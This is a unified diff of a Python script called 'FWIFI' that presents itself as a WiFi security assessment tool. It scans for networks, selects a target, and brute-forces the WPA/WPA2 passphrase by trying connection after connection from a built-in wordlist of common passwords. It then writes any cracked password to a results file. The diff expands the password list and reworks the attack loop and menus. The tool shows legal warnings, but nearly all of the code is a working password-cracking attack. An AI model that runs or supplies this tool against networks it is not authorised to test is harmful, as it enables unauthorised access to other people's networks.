@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 FWIFI - WiFi Security Assessment Tool
-Complete version with full error suppression and sequential testing
+Fixed version for pywifi compatibility
 """
 
 import pywifi
@@ -17,11 +17,11 @@ from datetime import datetime
 # COMPLETE LOGGING SUPPRESSION
 # ==============================
 
-# Disable all logging from pywifi and related modules
-logging.getLogger('pywifi').disabled = True
-logging.getLogger('wifi').disabled = True
-logging.getLogger('socket').disabled = True
-logging.getLogger('urllib3').disabled = True
+# Disable all logging
+logging.getLogger('pywifi').setLevel(logging.CRITICAL)
+logging.getLogger('wifi').setLevel(logging.CRITICAL)
+logging.getLogger('socket').setLevel(logging.CRITICAL)
+logging.getLogger('urllib3').setLevel(logging.CRITICAL)
 
 # Also disable warnings
 import warnings
@@ -70,6 +70,7 @@ class State:
     attempts = 0
     start_time = 0
     iface = None
+    wifi = None
 
 state = State()
 
@@ -86,13 +87,13 @@ def get_width():
     try:
         return shutil.get_terminal_size().columns
     except:
-        return 100
+        return 80
 
 def print_center(text):
     """Print centered text"""
     width = get_width()
     clean = remove_colors(text)
-    padding = (width - len(clean)) // 2
+    padding = max(0, (width - len(clean)) // 2)
     print(" " * padding + text)
 
 def remove_colors(text):
@@ -109,9 +110,18 @@ def print_box(text, color=C):
     """Print text in a box"""
     width = get_width()
     clean = remove_colors(text)
-    print(color + "╔" + "═" * (width - 2) + "╗" + X)
-    print(color + "║" + text.center(width - 2) + "║" + X)
-    print(color + "╚" + "═" * (width - 2) + "╝" + X)
+    text_len = len(clean)
+    
+    if text_len < width - 4:
+        left_pad = (width - text_len - 2) // 2
+        right_pad = width - text_len - left_pad - 2
+        print(color + "╔" + "═" * (width - 2) + "╗" + X)
+        print(color + "║" + " " * left_pad + text + " " * right_pad + "║" + X)
+        print(color + "╚" + "═" * (width - 2) + "╝" + X)
+    else:
+        print(color + "╔" + "═" * (width - 2) + "╗" + X)
+        print(color + "║ " + text[:width-4] + " ║" + X)
+        print(color + "╚" + "═" * (width - 2) + "╝" + X)
 
 def print_status(msg, status="info"):
     """Print status message"""
@@ -132,54 +142,32 @@ def print_banner():
     """Display the main banner"""
     clear()
     
-    # ASCII Art with FWIFI
-    ascii_art = [
-        f"{R}███████╗{B}██╗    ██╗{R}██╗{B}███████╗{R}██╗{X}",
-        f"{R}██╔════╝{B}██║    ██║{R}██║{B}██╔════╝{R}██║{X}",
-        f"{R}█████╗  {B}██║ █╗ ██║{R}██║{B}█████╗  {R}██║{X}",
-        f"{R}██╔══╝  {B}██║███╗██║{R}██║{B}██╔══╝  {R}╚═╝{X}",
-        f"{R}██║     {B}╚███╔███╔╝{R}██║{B}██║     {R}██╗{X}",
-        f"{R}╚═╝      {B}╚══╝╚══╝ {R}╚═╝{B}╚═╝     {R}╚═╝{X}"
-    ]
+    # Simplified ASCII Art
+    banner = f"""
+{R}╔═══════════════════════════════════════════════════╗
+║      ███████╗██╗    ██╗██╗███████╗██╗          ║
+║      ██╔════╝██║    ██║██║██╔════╝██║          ║
+║      █████╗  ██║ █╗ ██║██║█████╗  ██║          ║
+║      ██╔══╝  ██║███╗██║██║██╔══╝  ╚═╝          ║
+║      ██║     ╚███╔███╔╝██║██║     ██╗          ║
+║      ╚═╝      ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝          ║
+{G}║        WiFi Security Assessment Tool v3.1       ║
+║           Author: KRISH | Ethical Use          ║
+║      JOIN US: https://www.hackerseye.in       ║
+╚═══════════════════════════════════════════════════╝{X}
+"""
+    print(banner)
     
-    width = get_width()
-    
-    # Print top border
-    print(Y + "╔" + "═" * (width - 2) + "╗" + X)
-    print(Y + "║" + " " * (width - 2) + "║" + X)
-    
-    # Print ASCII art
-    for line in ascii_art:
-        clean = remove_colors(line)
-        padding = (width - len(clean)) // 2
-        print(Y + "║" + X + " " * padding + line + " " * (width - padding - len(clean) - 2) + Y + "║" + X)
-    
-    print(Y + "║" + " " * (width - 2) + "║" + X)
-    
-    # Tool info
-    info = [
-        f"{C}║   WiFi Security Assessment Tool v3.1   ║{X}",
-        f"{G}║     Author: KRISH | Ethical Use Only     ║{X}",
-        f"{G}║    JOIN US: https://www.hackerseye.in     ║{X}",
-        f"{Y}╚══════════════════════════════════════════╝{X}"
-    ]
-    
-    for line in info:
-        clean = remove_colors(line)
-        padding = (width - len(clean)) // 2
-        print(Y + "║" + X + " " * padding + line + " " * (width - padding - len(clean) - 2) + Y + "║" + X)
-    
-    print(Y + "║" + " " * (width - 2) + "║" + X)
-    print(Y + "╚" + "═" * (width - 2) + "╝" + X)
-    
-    # Show current target
+    # Show current target if set
     if state.ssid:
         print_line()
         print_center(f"{C}Target:{X} {W}{state.ssid}{X}")
         print_center(f"{C}BSSID:{X} {GR}{state.bssid}{X}")
-        print_center(f"{C}Signal:{X} {G}{state.signal}%{X}")
+        if state.signal:
+            print_center(f"{C}Signal:{X} {G}{state.signal}%{X}")
         print_center(f"{C}Wordlist:{X} {P}{state.wordlist}{X}")
         print_line()
+    print()
 
 # ==============================
 # INITIALIZATION
@@ -195,13 +183,14 @@ def check_system():
             return False
         
         # Initialize WiFi
-        wifi = pywifi.PyWiFi()
-        if not wifi.interfaces():
+        state.wifi = pywifi.PyWiFi()
+        if not state.wifi.interfaces():
             print_status("No WiFi interface found", "error")
             print_status("Make sure WiFi adapter is enabled", "warning")
             return False
         
-        state.iface = wifi.interfaces()[0]
+        state.iface = state.wifi.interfaces()[0]
+        print_status(f"Using interface: {state.iface.name()}", "success")
         return True
         
     except Exception as e:
@@ -234,61 +223,85 @@ def legal_warning():
 {C}Continue? (yes/no): {X}"""
     
     print(warning)
-    return input().strip().lower() in ['y', 'yes']
+    response = input().strip().lower()
+    return response in ['y', 'yes', '1']
 
 def create_wordlists():
     """Create necessary wordlists"""
     os.makedirs("wordlists", exist_ok=True)
     os.makedirs("results", exist_ok=True)
     
-    # Default wordlist with sequential numbers
+    # Default wordlist
     default_path = "wordlists/default.txt"
     if not os.path.exists(default_path):
         print_status("Creating default wordlist...", "info")
         
         passwords = [
-            # Sequential numbers (1-20)
-            "1", "2", "3", "4", "5", "6", "7", "8", "9", "10",
-            "11", "12", "13", "14", "15", "16", "17", "18", "19", "20",
+            # Most common passwords
+            "123456", "password", "12345678", "qwerty", "123456789",
+            "12345", "1234", "111111", "1234567", "dragon",
+            "123123", "baseball", "abc123", "football", "monkey",
+            "letmein", "696969", "shadow", "master", "666666",
+            "qwertyuiop", "123321", "mustang", "1234567890", "michael",
+            "654321", "superman", "1qaz2wsx", "7777777", "121212",
+            "000000", "qazwsx", "123qwe", "killer", "trustno1",
+            "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter",
+            "buster", "soccer", "harley", "batman", "andrew",
+            "tigger", "sunshine", "iloveyou", "2000", "charlie",
+            "robert", "thomas", "hockey", "ranger", "daniel",
+            "starwars", "klaster", "112233", "george", "computer",
+            "michelle", "jessica", "pepper", "1111", "zxcvbn",
+            "555555", "11111111", "131313", "freedom", "777777",
+            "pass", "maggie", "159753", "aaaaaa", "ginger",
+            "princess", "joshua", "cheese", "amanda", "summer",
+            "love", "ashley", "nicole", "chelsea", "biteme",
+            "matthew", "access", "yankees", "987654321", "dallas",
+            "austin", "thunder", "taylor", "matrix", "mobilemail",
+            "mom", "monitor", "monitoring", "montana", "moon", "moscow",
             
-            # Common passwords
-            "password", "123456", "12345678", "1234", "qwerty",
-            "admin", "welcome", "12345", "password123", "admin123",
-            "letmein", "monkey", "dragon", "baseball", "football",
-            "hello", "secret", "asdf", "jordan", "superman",
-            "batman", "trustno1", "master", "sunshine", "iloveyou",
+            # WiFi specific
+            "wireless", "security", "internet", "network", "wifi123",
+            "mywifi", "homewifi", "linksys", "netgear", "dlink",
+            "cisco", "belkin", "tplink", "asus", "totolink",
+            "password123", "admin123", "welcome123", "default",
+            "changeme", "1234abcd", "abcd1234", "wifi@123", "wifi#123",
             
-            # WiFi common
-            "wifipassword", "wireless", "internet", "mywifi", "homewifi",
-            "linksys", "netgear", "dlink", "cisco", "belkin",
+            # Simple patterns
+            "1", "12", "123", "1234", "12345", "123456", "1234567", "12345678", "123456789",
+            "0", "00", "000", "0000", "00000", "000000",
+            "111", "1111", "11111", "111111",
+            "222", "2222", "22222", "222222",
+            "333", "3333", "33333", "333333",
+            "444", "4444", "44444", "444444",
+            "555", "5555", "55555", "555555",
+            "666", "6666", "66666", "666666",
+            "777", "7777", "77777", "777777",
+            "888", "8888", "88888", "888888",
+            "999", "9999", "99999", "999999",
             
             # Year based
             "2024", "2023", "2022", "2021", "2020",
             "2019", "2018", "2017", "2016", "2015",
+            "2014", "2013", "2012", "2011", "2010",
             
-            # Month based
+            # Month names
             "january", "february", "march", "april", "may",
             "june", "july", "august", "september", "october",
             "november", "december",
             
-            # Simple patterns
-            "abc123", "qwerty123", "asdfgh", "zxcvbn", "qazwsx",
-            "123abc", "123qwe", "1q2w3e", "1qaz2wsx", "q1w2e3r4",
-            
-            # Phone patterns
-            "0000", "1111", "2222", "3333", "4444",
-            "5555", "6666", "7777", "8888", "9999",
-            
             # Common names
             "john", "michael", "david", "robert", "james",
-            "mary", "jennifer", "linda", "patricia", "elizabeth"
+            "mary", "jennifer", "linda", "patricia", "elizabeth",
+            "william", "richard", "charles", "joseph", "thomas",
+            "susan", "barbara", "sarah", "karen", "nancy",
+            "lisa", "betty", "margaret", "sandra", "ashley"
         ]
         
         with open(default_path, 'w') as f:
             for pwd in passwords:
                 f.write(f"{pwd}\n")
         
-        print_status(f"Created wordlist with {len(passwords)} passwords", "success")
+        print_status(f"Created default wordlist with {len(passwords)} passwords", "success")
     
     state.wordlist = default_path
 
@@ -300,20 +313,34 @@ def scan():
     """Scan for WiFi networks"""
     try:
         print_status("Scanning for networks...", "info")
+        
+        # Start scan
         state.iface.scan()
         
-        # Show scanning animation
-        for i in range(3):
+        # Wait for scan to complete
+        for i in range(5):
             time.sleep(1)
             print(f"{C}.{X}", end='', flush=True)
         print()
         
+        # Get results
         results = state.iface.scan_results()
+        
         if not results:
             print_status("No networks found", "warning")
             return []
         
-        return results
+        # Remove duplicates
+        unique_results = []
+        seen_bssids = set()
+        
+        for net in results:
+            if net.bssid not in seen_bssids:
+                seen_bssids.add(net.bssid)
+                unique_results.append(net)
+        
+        print_status(f"Found {len(unique_results)} networks", "success")
+        return unique_results
         
     except Exception as e:
         print_status(f"Scan failed: {str(e)}", "error")
@@ -325,12 +352,12 @@ def show_networks(networks):
         return
     
     print_box(f"FOUND {len(networks)} NETWORKS", G)
-    print(f"{C}{'No.':<4} {'SSID':<25} {'Signal':<8} {'BSSID':<17}{X}")
+    print(f"{C}{'No.':<4} {'SSID':<25} {'Signal':<8} {'BSSID':<17} {'Security':<12}{X}")
     print_line("─", C)
     
     for i, net in enumerate(networks, 1):
         ssid = net.ssid if net.ssid else "Hidden Network"
-        signal = min(100, max(0, (net.signal + 100) * 2))
+        signal = min(100, max(0, net.signal + 100))
         
         # Color code signal
         if signal > 70:
@@ -340,10 +367,25 @@ def show_networks(networks):
         else:
             color = R
         
+        # Determine security type
+        security = []
+        if const.AKM_TYPE_WPA in net.akm:
+            security.append("WPA")
+        if const.AKM_TYPE_WPA2 in net.akm:
+            security.append("WPA2")
+        if const.AKM_TYPE_WPAPSK in net.akm:
+            security.append("WPA-PSK")
+        if const.AKM_TYPE_WPA2PSK in net.akm:
+            security.append("WPA2-PSK")
+        if not security:
+            security.append("Open")
+        
+        sec_text = "/".join(security)
+        
         # Truncate long SSIDs
         display_ssid = ssid[:24] + ".." if len(ssid) > 26 else ssid.ljust(26)
         
-        print(f" {C}{i:>3}.{X} {display_ssid} {color}{int(signal):>3}%{X}  {GR}{net.bssid}{X}")
+        print(f" {C}{i:>3}.{X} {display_ssid} {color}{signal:>3}%{X}  {GR}{net.bssid}{X}  {P}{sec_text:<12}{X}")
 
 def select_target():
     """Select target network"""
@@ -368,68 +410,97 @@ def select_target():
                 state.network = net
                 state.ssid = net.ssid if net.ssid else "Hidden_Network"
                 state.bssid = net.bssid
-                state.signal = int(min(100, max(0, (net.signal + 100) * 2)))
+                state.signal = min(100, max(0, net.signal + 100))
                 
-                print_status(f"Target: {state.ssid}", "success")
+                print_status(f"Selected: {state.ssid} ({state.bssid})", "success")
+                
+                # Show security info
+                security = []
+                if const.AKM_TYPE_WPA in net.akm or const.AKM_TYPE_WPAPSK in net.akm:
+                    security.append("WPA")
+                if const.AKM_TYPE_WPA2 in net.akm or const.AKM_TYPE_WPA2PSK in net.akm:
+                    security.append("WPA2")
+                
+                if security:
+                    print_status(f"Security: {'/'.join(security)}", "info")
+                else:
+                    print_status("Warning: Open network (no password)", "warning")
+                
                 return True
             else:
                 print_status("Invalid selection", "error")
                 
         except ValueError:
             print_status("Enter a number", "error")
+        except KeyboardInterrupt:
+            return False
 
 # ==============================
-# ATTACK ENGINE WITH COMPLETE SUPPRESSION
+# PASSWORD TESTING
 # ==============================
 
 def test_password(password):
-    """Test a single password with complete error suppression"""
+    """Test a single password"""
     try:
-        # Create profile
+        # Disconnect first
+        if state.iface.status() == const.IFACE_CONNECTED:
+            state.iface.disconnect()
+            time.sleep(0.5)
+        
+        # Remove all profiles
+        state.iface.remove_all_network_profiles()
+        
+        # Create new profile
         profile = pywifi.Profile()
         profile.ssid = state.ssid
         profile.auth = const.AUTH_ALG_OPEN
         
-        if state.network and state.network.akm:
-            profile.akm = state.network.akm
+        # Set security based on network
+        if state.network:
+            if const.AKM_TYPE_WPA in state.network.akm or const.AKM_TYPE_WPAPSK in state.network.akm:
+                profile.akm.append(const.AKM_TYPE_WPAPSK)
+            if const.AKM_TYPE_WPA2 in state.network.akm or const.AKM_TYPE_WPA2PSK in state.network.akm:
+                profile.akm.append(const.AKM_TYPE_WPA2PSK)
+            
+            # Copy cipher
+            if state.network.cipher:
+                profile.cipher = state.network.cipher
+            else:
+                profile.cipher = const.CIPHER_TYPE_CCMP
         else:
+            # Default to WPA2
             profile.akm.append(const.AKM_TYPE_WPA2PSK)
+            profile.cipher = const.CIPHER_TYPE_CCMP
         
-        profile.cipher = const.CIPHER_TYPE_CCMP
         profile.key = password
         
-        # Remove existing profiles
-        state.iface.remove_all_network_profiles()
-        
-        # Add new profile
+        # Add profile
         tmp_profile = state.iface.add_network_profile(profile)
         
-        # Connect with timeout
+        # Attempt connection
         state.iface.connect(tmp_profile)
         
-        # Check connection status
-        timeout = 4  # Reduced timeout for faster testing
-        start = time.time()
+        # Wait for connection
+        for _ in range(6):  # Wait up to 3 seconds
+            time.sleep(0.5)
+            if state.iface.status() == const.IFACE_CONNECTED:
+                return True
+            elif state.iface.status() == const.IFACE_DISCONNECTED:
+                break
         
-        while state.iface.status() == const.IFACE_CONNECTING:
-            if time.time() - start > timeout:
-                state.iface.disconnect()
-                return False
-            time.sleep(0.3)
-        
-        connected = state.iface.status() == const.IFACE_CONNECTED
-        
-        # Always disconnect to clean up
-        state.iface.disconnect()
-        
-        return connected
-        
-    except Exception:
-        # Silent failure - we don't want any output
         return False
+        
+    except Exception as e:
+        return False
+    finally:
+        # Always disconnect
+        try:
+            state.iface.disconnect()
+        except:
+            pass
 
 def brute_force():
-    """Main attack function with silent operation"""
+    """Main attack function"""
     if not state.ssid:
         print_status("No target selected", "error")
         return
@@ -438,8 +509,8 @@ def brute_force():
     try:
         with open(state.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
             passwords = [line.strip() for line in f if line.strip()]
-    except:
-        print_status("Failed to load wordlist", "error")
+    except Exception as e:
+        print_status(f"Failed to load wordlist: {str(e)}", "error")
         return
     
     if not passwords:
@@ -453,7 +524,7 @@ def brute_force():
     
     # Confirm
     confirm = input(f"{Y}[?] Start attack? (y/n): {X}").lower()
-    if confirm not in ['y', 'yes']:
+    if confirm not in ['y', 'yes', '1']:
         print_status("Cancelled", "warning")
         return
     
@@ -467,66 +538,38 @@ def brute_force():
     print(f"{C}Starting attack... Press Ctrl+C to stop{X}")
     print_line()
     
-    # Suppress ALL output during attack
-    old_stdout = sys.stdout
-    old_stderr = sys.stderr
-    
+    # Test passwords
     try:
-        # Redirect ALL output to null during password testing
-        with open(os.devnull, 'w') as devnull:
-            sys.stdout = devnull
-            sys.stderr = devnull
+        for idx, pwd in enumerate(passwords, 1):
+            state.attempts = idx
             
-            for idx, pwd in enumerate(passwords, 1):
-                state.attempts = idx
-                
-                # Calculate progress
-                progress = (idx / len(passwords)) * 100
-                elapsed = time.time() - state.start_time
-                speed = idx / elapsed if elapsed > 0 else 0
-                remaining = (len(passwords) - idx) / speed if speed > 0 else 0
-                
-                # Restore output for progress display only
-                sys.stdout = old_stdout
-                sys.stderr = old_stderr
-                
-                # Show progress
-                if len(pwd) < 6:
-                    pwd_color = R
-                elif len(pwd) < 8:
-                    pwd_color = Y
-                else:
-                    pwd_color = G
-                
-                print(f"\r{C}[{idx:05d}/{len(passwords):05d}] {progress:5.1f}% | "
-                      f"{speed:6.1f} pwd/sec | ETA: {remaining:4.0f}s | "
-                      f"{pwd_color}{pwd[:35]:<35}{X}", end='', flush=True)
-                
-                # Suppress again for testing
-                sys.stdout = devnull
-                sys.stderr = devnull
-                
-                # Test password
-                if test_password(pwd):
-                    state.found = True
-                    state.password = pwd
-                    break
-        
-        # Restore output
-        sys.stdout = old_stdout
-        sys.stderr = old_stderr
-        
+            # Calculate progress
+            progress = (idx / len(passwords)) * 100
+            elapsed = time.time() - state.start_time
+            speed = idx / elapsed if elapsed > 0 else 0
+            remaining = (len(passwords) - idx) / speed if speed > 0 else 0
+            
+            # Show progress
+            if len(pwd) < 6:
+                pwd_color = R
+            elif len(pwd) < 8:
+                pwd_color = Y
+            else:
+                pwd_color = G
+            
+            print(f"\r{C}[{idx:05d}/{len(passwords):05d}] {progress:5.1f}% | "
+                  f"{speed:5.1f} pwd/s | ETA: {remaining:4.0f}s | "
+                  f"{pwd_color}{pwd[:25]:<25}{X}", end='', flush=True)
+            
+            # Test password
+            if test_password(pwd):
+                state.found = True
+                state.password = pwd
+                break
+    
     except KeyboardInterrupt:
-        # Restore output on interrupt
-        sys.stdout = old_stdout
-        sys.stderr = old_stderr
         print(f"\n\n{Y}[!] Attack interrupted{X}")
         return
-        
-    finally:
-        # Ensure output is restored
-        sys.stdout = old_stdout
-        sys.stderr = old_stderr
     
     # Show results
     print("\n")
@@ -537,11 +580,22 @@ def brute_force():
         show_success()
     else:
         show_failure()
+    
+    # Clean up
+    try:
+        state.iface.disconnect()
+        state.iface.remove_all_network_profiles()
+    except:
+        pass
 
 def save_result():
     """Save successful result"""
     try:
-        filename = f"results/{state.ssid.replace(' ', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        safe_ssid = "".join(c for c in state.ssid if c.isalnum() or c in ('_', '-'))
+        if not safe_ssid:
+            safe_ssid = "Hidden"
+            
+        filename = f"results/{safe_ssid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
         with open(filename, 'w') as f:
             f.write("=" * 60 + "\n")
             f.write("FWIFI TOOL - SUCCESSFUL CRACK\n")
@@ -552,12 +606,13 @@ def save_result():
             f.write(f"Signal:       {state.signal}%\n")
             f.write(f"Attempts:     {state.attempts}\n")
             f.write(f"Time:         {time.time() - state.start_time:.1f}s\n")
-            f.write(f"Speed:        {state.attempts/(time.time() - state.start_time):.1f} pwd/sec\n")
+            if state.start_time > 0 and (time.time() - state.start_time) > 0:
+                f.write(f"Speed:        {state.attempts/(time.time() - state.start_time):.1f} pwd/sec\n")
             f.write(f"Date:         {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
         
         print_status(f"Results saved to {filename}", "success")
-    except:
-        print_status("Failed to save results", "error")
+    except Exception as e:
+        print_status(f"Failed to save results: {str(e)}", "error")
 
 def show_success():
     """Display success screen"""
@@ -578,228 +633,128 @@ def show_failure():
     print_center(f"{Y}No valid password found in wordlist{X}")
 
 # ==============================
-# WORDLIST MANAGEMENT
-# ==============================
-
-def manage_wordlist():
-    """Manage wordlist selection"""
-    print_box("WORDLIST MANAGEMENT", P)
-    
-    # Show current
-    current = os.path.basename(state.wordlist)
-    print_center(f"{C}Current:{X} {current}")
-    
-    # Show available
-    if os.path.exists("wordlists"):
-        print(f"\n{C}Available wordlists:{X}")
-        files = [f for f in os.listdir("wordlists") if f.endswith('.txt')]
-        for i, f in enumerate(files, 1):
-            size = os.path.getsize(f"wordlists/{f}") / 1024
-            print(f"  {G}{i}.{X} {f} ({size:.1f} KB)")
-    
-    print(f"\n{Y}Options:{X}")
-    print(f"  {C}1.{X} Select from list")
-    print(f"  {C}2.{X} Enter custom path")
-    print(f"  {C}3.{X} Create new wordlist")
-    print(f"  {C}4.{X} View current wordlist")
-    print(f"  {C}5.{X} Cancel")
-    
-    choice = input(f"\n{Y}[?] Choose option: {X}").strip()
-    
-    if choice == "1" and os.path.exists("wordlists"):
-        files = [f for f in os.listdir("wordlists") if f.endswith('.txt')]
-        if files:
-            for i, f in enumerate(files, 1):
-                print(f"  {G}{i}.{X} {f}")
-            sel = input(f"\n{Y}[?] Select wordlist (1-{len(files)}): {X}")
-            try:
-                idx = int(sel) - 1
-                if 0 <= idx < len(files):
-                    state.wordlist = f"wordlists/{files[idx]}"
-                    print_status(f"Selected: {files[idx]}", "success")
-            except:
-                print_status("Invalid selection", "error")
-    
-    elif choice == "2":
-        path = input(f"{Y}[?] Enter path to wordlist: {X}").strip()
-        if os.path.exists(path):
-            state.wordlist = path
-            print_status(f"Wordlist set: {path}", "success")
-        else:
-            print_status("File not found", "error")
-    
-    elif choice == "3":
-        create_custom_wordlist()
-    
-    elif choice == "4":
-        view_wordlist()
-
-# ==============================
-# CUSTOM WORDLIST CREATION
-# ==============================
-
-def create_custom_wordlist():
-    """Create a custom wordlist"""
-    print_box("CREATE CUSTOM WORDLIST", P)
-    
-    name = input(f"{Y}[?] Wordlist name (without .txt): {X}").strip()
-    if not name:
-        print_status("Cancelled", "warning")
-        return
-    
-    path = f"wordlists/{name}.txt"
-    
-    print(f"\n{C}What to include:{X}")
-    print(f"  {G}1.{X} Sequential numbers (1-1000)")
-    print(f"  {G}2.{X} Common passwords")
-    print(f"  {G}3.{X} Date combinations")
-    print(f"  {G}4.{X} Phone numbers")
-    print(f"  {G}5.{X} Custom list")
-    print(f"  {G}6.{X} All of the above")
-    
-    choice = input(f"\n{Y}[?] Choose (1-6): {X}").strip()
-    
-    passwords = []
-    
-    if choice in ["1", "6"]:
-        # Sequential numbers 1-1000
-        passwords.extend([str(i) for i in range(1, 1001)])
-        print_status("Added: Numbers 1-1000", "success")
-    
-    if choice in ["2", "6"]:
-        # Common passwords
-        common = ["password", "123456", "admin", "welcome", "qwerty",
-                  "letmein", "monkey", "sunshine", "password1", "admin123"]
-        passwords.extend(common)
-        print_status("Added: Common passwords", "success")
-    
-    if choice in ["3", "6"]:
-        # Date combinations
-        dates = []
-        for y in range(2000, 2025):
-            for m in range(1, 13):
-                for d in range(1, 32):
-                    dates.append(f"{d:02d}{m:02d}{y}")
-                    dates.append(f"{m:02d}{d:02d}{y}")
-        passwords.extend(dates[:1000])  # Limit to 1000 dates
-        print_status("Added: Date combinations", "success")
-    
-    if choice in ["4", "6"]:
-        # Phone patterns
-        phones = ["0000", "1111", "1234", "4321", "9999",
-                  "1212", "1313", "1414", "1515", "123123"]
-        passwords.extend(phones)
-        print_status("Added: Phone patterns", "success")
-    
-    if choice == "5":
-        # Custom input
-        print(f"\n{C}Enter passwords (one per line, empty line to finish):{X}")
-        while True:
-            pwd = input(f"{GR}>>> {X}").strip()
-            if not pwd:
-                break
-            passwords.append(pwd)
-        print_status(f"Added {len(passwords)} custom passwords", "success")
-    
-    # Remove duplicates and save
-    passwords = list(dict.fromkeys(passwords))
-    
-    with open(path, 'w') as f:
-        for pwd in passwords:
-            f.write(f"{pwd}\n")
-    
-    print_status(f"Created {name}.txt with {len(passwords)} passwords", "success")
-    state.wordlist = path
-
-def view_wordlist():
-    """View contents of current wordlist"""
-    try:
-        with open(state.wordlist, 'r') as f:
-            lines = f.readlines()
-        
-        print_box(f"VIEWING: {os.path.basename(state.wordlist)}", C)
-        print_center(f"{C}Total passwords: {len(lines)}{X}")
-        print_center(f"{C}File size: {os.path.getsize(state.wordlist)/1024:.1f} KB{X}")
-        print()
-        
-        # Show first 20 passwords
-        print(f"{C}First 20 passwords:{X}")
-        for i, line in enumerate(lines[:20], 1):
-            print(f"  {G}{i:2d}.{X} {line.strip()}")
-        
-        if len(lines) > 20:
-            print(f"  {GR}... and {len(lines)-20} more{X}")
-        
-        print()
-        input(f"{Y}Press Enter to continue...{X}")
-        
-    except:
-        print_status("Failed to read wordlist", "error")
-
-# ==============================
 # MENU SYSTEM
 # ==============================
 
-def show_help():
-    """Show help menu"""
-    print_box("HELP & COMMANDS", C)
-    
-    commands = [
-        ("scan", "Scan for WiFi networks"),
-        ("target", "Select target network"),
-        ("wordlist", "Manage wordlists"),
-        ("attack", "Start brute-force attack"),
-        ("clear", "Clear screen"),
-        ("help", "Show this help"),
-        ("exit", "Exit tool")
-    ]
-    
-    for cmd, desc in commands:
-        print(f"  {G}{cmd:<10}{X} - {desc}")
-    
-    print(f"\n{Y}Example workflow:{X}")
-    print(f"  1. {C}scan{X} - Find networks")
-    print(f"  2. {C}target{X} - Choose target")
-    print(f"  3. {C}wordlist{X} - Set wordlist")
-    print(f"  4. {C}attack{X} - Start cracking")
-
 def main_menu():
     """Main menu loop"""
+    commands = {
+        "1": ("Scan Networks", scan_and_show),
+        "2": ("Select Target", lambda: select_target() and print_banner()),
+        "3": ("Set Wordlist", set_wordlist),
+        "4": ("Start Attack", brute_force),
+        "5": ("Show Info", show_info),
+        "6": ("Help", show_help),
+        "7": ("Exit", lambda: (print_status("Goodbye!", "info"), sys.exit(0)))
+    }
+    
     while True:
         try:
-            prompt = f"{G}FWIFI"
-            if state.ssid:
-                prompt += f"@{state.ssid[:15]}"
-            prompt += f"${X} "
+            print_banner()
+            print(f"{C}Main Menu:{X}")
+            print_line("-", C)
             
-            cmd = input(prompt).strip().lower()
+            for key, (desc, _) in commands.items():
+                print(f"  {G}{key}.{X} {desc}")
             
-            if cmd == "scan":
-                networks = scan()
-                show_networks(networks)
-            elif cmd == "target":
-                if select_target():
-                    print_banner()
-            elif cmd == "wordlist":
-                manage_wordlist()
-                print_banner()
-            elif cmd == "attack":
-                brute_force()
-                print_banner()
-            elif cmd in ["clear", "cls"]:
-                print_banner()
-            elif cmd == "help":
-                show_help()
-            elif cmd in ["exit", "quit"]:
-                print_status("Goodbye!", "info")
-                sys.exit(0)
-            elif cmd:
-                print_status(f"Unknown command: {cmd}", "error")
+            print_line("-", C)
+            
+            choice = input(f"\n{Y}[?] Select option (1-7): {X}").strip()
+            
+            if choice in commands:
+                commands[choice][1]()
+            else:
+                print_status("Invalid choice", "error")
+                time.sleep(1)
                 
         except KeyboardInterrupt:
-            print(f"\n{Y}[!] Type 'exit' to quit{X}")
+            print(f"\n{Y}[!] Type '7' to exit{X}")
         except Exception as e:
             print_status(f"Error: {str(e)}", "error")
+            time.sleep(2)
+
+def scan_and_show():
+    """Scan and show networks"""
+    networks = scan()
+    if networks:
+        show_networks(networks)
+        input(f"\n{Y}Press Enter to continue...{X}")
+
+def set_wordlist():
+    """Set wordlist"""
+    print_box("SELECT WORDLIST", P)
+    
+    if os.path.exists("wordlists"):
+        files = [f for f in os.listdir("wordlists") if f.endswith('.txt')]
+        if files:
+            print(f"{C}Available wordlists:{X}")
+            for i, f in enumerate(files, 1):
+                size = os.path.getsize(f"wordlists/{f}") / 1024
+                current = " (CURRENT)" if f"wordlists/{f}" == state.wordlist else ""
+                print(f"  {G}{i}.{X} {f} ({size:.1f} KB){current}")
+            
+            try:
+                sel = input(f"\n{Y}[?] Select (1-{len(files)}) or Enter to cancel: {X}").strip()
+                if sel:
+                    idx = int(sel) - 1
+                    if 0 <= idx < len(files):
+                        state.wordlist = f"wordlists/{files[idx]}"
+                        print_status(f"Selected: {files[idx]}", "success")
+                        time.sleep(1)
+            except:
+                print_status("Invalid selection", "error")
+                time.sleep(2)
+        else:
+            print_status("No wordlists found", "warning")
+            time.sleep(2)
+    else:
+        print_status("Wordlists directory not found", "error")
+        time.sleep(2)
+
+def show_info():
+    """Show current information"""
+    print_box("CURRENT INFORMATION", C)
+    print(f"{C}Interface:{X} {state.iface.name() if state.iface else 'Not set'}")
+    print(f"{C}Target SSID:{X} {state.ssid if state.ssid else 'Not set'}")
+    print(f"{C}Target BSSID:{X} {state.bssid if state.bssid else 'Not set'}")
+    print(f"{C}Current Wordlist:{X} {state.wordlist}")
+    
+    if os.path.exists(state.wordlist):
+        try:
+            with open(state.wordlist, 'r') as f:
+                count = sum(1 for _ in f)
+            print(f"{C}Passwords in list:{X} {count}")
+        except:
+            print(f"{C}Passwords in list:{X} Cannot read")
+    else:
+        print(f"{C}Wordlist exists:{X} {R}No{X}")
+    
+    print()
+    input(f"{Y}Press Enter to continue...{X}")
+
+def show_help():
+    """Show help"""
+    print_box("HELP & INFORMATION", B)
+    print(f"""
+{G}Basic Workflow:{X}
+  1. Scan for available networks
+  2. Select your target network
+  3. Choose a wordlist (or use default)
+  4. Start the attack
+
+{C}Requirements:{X}
+  • Linux system (preferred) or Windows
+  • Root/Administrator privileges
+  • WiFi adapter
+  • pywifi library installed
+
+{Y}Note:{X} This tool works best on Linux systems. Windows support
+may be limited depending on your WiFi adapter drivers.
+
+{R}Legal Warning:{X} Only test networks you own or have explicit
+permission to test. Unauthorized access is illegal.
+""")
+    input(f"\n{Y}Press Enter to continue...{X}")
 
 # ==============================
 # MAIN FUNCTION
@@ -819,10 +774,6 @@ def main():
         
         # Setup
         create_wordlists()
-        
-        # Show banner
-        print_banner()
-        show_help()
